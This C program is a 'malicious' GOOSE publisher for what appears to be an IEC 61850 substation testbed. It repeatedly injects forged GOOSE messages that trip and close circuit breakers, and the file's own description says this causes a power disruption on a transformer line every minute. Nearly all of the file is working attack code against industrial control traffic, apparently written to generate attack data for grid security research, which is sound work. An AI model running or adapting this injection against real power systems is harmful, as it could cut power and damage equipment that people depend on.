/*
 * goose_publisher_malicious_903 
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the Benign publisher program, this malicious program will be also running and publishing 50 GOOSE packets (100ms heartbeat) mal_Pub_TRSF1 (1110: open CB1_66KV, CB2_66KV, CB_TRSF1, close CB2_22KV) to physcial process (Simulink) under normal operation every 1 mins

Physical process level:There will be a energy disruption every 1 mins on Transformer1 line.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//Define the period of sending mal-packet in minute
#define period	 1

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int x = 0;
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x8001;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x00;
	gooseCommParameters.dstAddress[5] = 0x01;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;
	
	LinkedList dataSetValues = LinkedList_create();
	

	/*
	 * Create a new GOOSE publisher instance. As the second parameter the interface
	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	 * stack_config.h is used.
	 */
	 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "SimulationTestbed/PIOC$TRSF1$CBStval");
	    GoosePublisher_setTimeAllowedToLive(publisher, 2000);    
	    GoosePublisher_setDataSetRef(publisher, "SimulationTestbed/PIOC$CBStval");
	    GoosePublisher_setGoID(publisher , "PIOC_TRSF1_CBStval");
	    GoosePublisher_setConfRev(publisher, 1);
	    
	    while (1) {
	    	
	    	LinkedList dataSetValues = LinkedList_create();
	    	
		for (int i = 0; i <3; i++ )
				LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(1));
		
		LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(0));
		
		Thread_sleep(period*60000);
		
		for (int i = 0; i <50; i++ ) {			
			GoosePublisher_publish(publisher, dataSetValues);
			Thread_sleep(100);
		}
		    
		LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);

	   }
	   
	   GoosePublisher_destroy(publisher);
	}
	else {
	    printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}
